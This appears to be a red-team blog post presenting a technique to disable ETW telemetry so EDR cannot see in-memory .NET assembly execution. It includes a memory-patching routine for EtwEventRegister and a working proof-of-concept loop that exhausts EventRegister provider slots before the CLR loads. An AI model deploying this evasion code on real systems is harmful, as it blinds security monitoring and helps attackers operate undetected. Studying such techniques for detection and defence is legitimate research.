---
layout: post
title: A Novel Method for Bypassing ETW
date: '2023-03-15 00:00:00'
img_path: /assets/img/2023-03-15/
categories: ['Red Team', 'Windows']
tags: []
---
I wanted to bypass Event Tracing for Windows (ETW) without any memory patching or hardware breakpoints.  The purpose of breaking ETW is almost always to prevent EDR from gaining telemetry on the execution of C# assemblies. An example of some of the telemetry is shown below with the execution of Seatbelt in-memory inside the NanoBeacon process:

![ProcessHacker shows loaded .Net assemblies](/assets/img/2023-03-15/bad.png)

The current public methods of breaking ETW all patch functions in memory. They do something like this:
```c++
BOOL patchETW(BOOL revertETW) {
#ifdef _M_AMD64
    const SIZE_T patchSize = 1;
    unsigned char etwPatch[] = { 0xc3 }; // ret
    unsigned char etwrevert[] = { 0x40 };
#elif defined(_M_IX86)
    const SIZE_T patchSize = 3;
    unsigned char etwPatch[] = { 0xc2, 0x14, 0x00 };
    unsigned char etwrevert[] = { 0x8b, 0xff, 0x55 };
#endif

    //Get pointer to EtwEventWrite 
    void* pAddress = (PVOID)GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventRegister");
    PVOID lpBaseAddress = pAddress;
    ULONG OldProtection, NewProtection;
    ULONG uSize = patchSize;
    //Change memory protection via NTProtectVirtualMemory
    NTSTATUS status = NtProtectVirtualMemory(NtCurrentProcess(), lpBaseAddress, &uSize, PAGE_READWRITE, &OldProtection);
    //Patch EtwEventRegister via NTWriteVirtualMemory
    status = NtWriteVirtualMemory(NtCurrentProcess(), pAddress, (PVOID)(revertETW ? etwrevert : etwPatch), patchSize, NULL);
    //Revert back memory protection via NTProtectVirtualMemory
    status = NtProtectVirtualMemory(NtCurrentProcess(), lpBaseAddress, &uSize, OldProtection, &NewProtection);
    return 1;
}
```

These could be detected by EDR that have the `NtProtectVirtualMemory` and `NtWriteVirtualMemory` functions hooked. 

There are approaches that take advantage of hardware breakpoints to redirect execution flow without any memory patching. However this method have many downsides like the risk of the hardware breakpoint being detected, and the implementation being very difficult. There are also as far as I know no public tools that demo this for bypassing ETW and that’s because, the .Net Common Language Runtime (CLR) when loaded, starts it own threads, which you’d need to somehow hijack to setup the hardware breakpoint, which then _often_ leads to  patching memory, so it’s just the above method with extra steps.

There is a solution, that’s easy to implement and very effective at the time of writing. The [EventRegister](https://learn.microsoft.com/en-us/windows/win32/api/evntprov/nf-evntprov-eventregister) function:
> Registers an ETW event provider, creating a handle that can be used to write ETW events.

This is the function used by software to create an ETW provider which can then be used to send ETW events. The CLR (which is clr.dll at its core) calls the `EventRegister()` when being loaded to be able to provide the telemetry to EDRs or consumers like ProcessHacker.

An important note on `EventRegister` is that programs should ignore the return value, and just continue working: 
> Most production code should continue to run even if an ETW provider failed to register, so release builds should usually ignore the error code returned by `EventRegister`.

So, my question is, how many ETW event providers can the system/process have? Well, it turns out that a process can have at most [2048](https://www.geoffchappell.com/studies/windows/win32/ntdll/api/etw/evntsup/reghandle.htm). So, if a malicious program calls `EventRegister` 2048 times, or better yet, until an error occures, before loading the CLR, there cannot be any further event providers in the process.

My proof-of-concept code is below which demonstrates spamming the `EventRegister` function to fill the kernel mode red-black tree thus preventing further ETW providers for registering.
```c++
void breakETW_Forever() {
    DWORD status = ERROR_SUCCESS;
    REGHANDLE RegistrationHandle = NULL;
    const GUID ProviderGuid = { 0x230d3ce1, 0xbccc, 0x124e, {0x93, 0x1b, 0xd9, 0xcc, 0x2e, 0xee, 0x27, 0xe4} }; //.NET Common Language Runtime
    int count = 0;
    while (status = EventRegister(&ProviderGuid, NULL, NULL, &RegistrationHandle) == ERROR_SUCCESS) {
        count++;
    }
    //printf("%d\n", count);
}
```

And this is how ProcessHacker .Net assemblies tab looks running Seatbelt in-memory after executing the PoC:
![ProcessHacker shows nothing](/assets/img/2023-03-15/good.png)

There is no ETW telemetry so anyone consuming ETW events (_cough_ EDR _cough_) would be blind to the execution. 
